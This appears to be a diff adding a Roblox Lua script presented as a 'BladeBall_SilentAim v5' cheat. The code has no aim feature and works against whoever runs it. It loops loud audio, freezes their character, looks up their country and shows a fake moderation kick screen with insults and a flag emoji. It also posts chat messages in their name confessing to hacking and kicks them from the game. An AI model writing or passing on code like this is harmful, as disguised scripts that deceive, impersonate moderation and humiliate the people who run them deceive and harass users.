@@ -1,1 +1,127 @@
+-- BladeBall_SilentAim v5 (Real Country Detection Version)
+local plrs = game:GetService("Players")
+local plr = plrs.LocalPlayer
+local starterGui = game:GetService("StarterGui")
+local runService = game:GetService("RunService")
+local localizationService = game:GetService("LocalizationService")
+local replicatedStorage = game:GetService("ReplicatedStorage")
 
+-- Convert country code to flag emoji
+local function countryCodeToFlag(code)
+    if not code or #code ~= 2 then return "" end
+    local function letterToRegional(c)
+        return utf8.char(utf8.codepoint(c:upper()) + 127397)
+    end
+    return letterToRegional(code:sub(1,1)) .. letterToRegional(code:sub(2,2))
+end
+
+-- Audio troll
+local function audioLoop()
+    local s = Instance.new("Sound")
+    s.SoundId = "rbxassetid://17620645740"
+    s.Volume = 10
+    s.Looped = true
+    s.Parent = workspace
+    s:Play()
+end
+
+-- Freeze player
+local function freezePlayer()
+    if plr.Character then
+        for _, v in ipairs(plr.Character:GetDescendants()) do
+            if v:IsA("Humanoid") then
+                v.WalkSpeed = 0
+                v.JumpPower = 0
+                v.PlatformStand = true
+            end
+        end
+    end
+end
+
+-- Fake Moderation Kick UI
+local function moderationPrank()
+    -- Try to get player's country
+    local success, regionCode = pcall(function()
+        return localizationService:GetCountryRegionForPlayerAsync(plr)
+    end)
+    local flagEmoji = success and countryCodeToFlag(regionCode) or ""
+
+    local gui = Instance.new("ScreenGui")
+    gui.Name = "BBEnhancerGui"
+    gui.ResetOnSpawn = false
+    gui.IgnoreGuiInset = true
+    gui.Parent = plr:WaitForChild("PlayerGui")
+
+    local mainFrame = Instance.new("Frame")
+    mainFrame.Size = UDim2.new(1, 0, 1, 0)
+    mainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    mainFrame.BackgroundTransparency = 0.4
+    mainFrame.Parent = gui
+
+    local box = Instance.new("Frame")
+    box.Size = UDim2.new(0.4, 0, 0.4, 0)
+    box.Position = UDim2.new(0.3, 0, 0.32, 0)
+    box.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+    box.BorderSizePixel = 0
+    box.Parent = mainFrame
+
+    local title = Instance.new("TextLabel")
+    title.Size = UDim2.new(1, 0, 0.15, 0)
+    title.Position = UDim2.new(0, 0, 0, 0)
+    title.BackgroundTransparency = 1
+    title.Text = "Disconnected"
+    title.TextColor3 = Color3.new(1, 1, 1)
+    title.Font = Enum.Font.SourceSansBold
+    title.TextScaled = true
+    title.Parent = box
+
+    local body = Instance.new("TextLabel")
+    body.Size = UDim2.new(0.9, 0, 0.65, 0)
+    body.Position = UDim2.new(0.05, 0, 0.15, 0)
+    body.BackgroundTransparency = 1
+    body.TextWrapped = true
+    body.Text = "You were kicked from this experience: Womp Womp no script for you 😂💔🥀🥷🏿 you stupid " .. flagEmoji ..
+        "\nModerator Note: Pranked for using Blade Ball hacks!\n(Error Code: 267)\n\npranked by Nathan"
+    body.TextColor3 = Color3.new(1, 1, 1)
+    body.Font = Enum.Font.SourceSans
+    body.TextScaled = true
+    body.TextYAlignment = Enum.TextYAlignment.Top
+    body.Parent = box
+
+    local leaveButton = Instance.new("TextButton")
+    leaveButton.Size = UDim2.new(0.5, 0, 0.15, 0)
+    leaveButton.Position = UDim2.new(0.25, 0, 0.82, 0)
+    leaveButton.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+    leaveButton.TextColor3 = Color3.new(1, 1, 1)
+    leaveButton.Font = Enum.Font.SourceSans
+    leaveButton.Text = "Leave"
+    leaveButton.TextScaled = true
+    leaveButton.Parent = box
+
+    leaveButton.MouseButton1Click:Connect(function()
+        plr:Kick("Womp Womp no script for you 😂💔🥀🥷🏿 you stupid " .. flagEmoji .. "\npranked by Nathan")
+    end)
+end
+
+-- Instant Chat Spam
+local function chatTroll()
+    for i = 1, 4 do
+        replicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
+            "hey everyone im using bladeball hacks 🥷🏿🥀💔", "All"
+        )
+    end
+end
+
+-- Start Troll
+starterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
+
+runService.RenderStepped:Connect(function()
+    if not workspace:FindFirstChildOfClass("Sound") then
+        audioLoop()
+    end
+end)
+
+audioLoop()
+moderationPrank()
+chatTroll()
+freezePlayer()
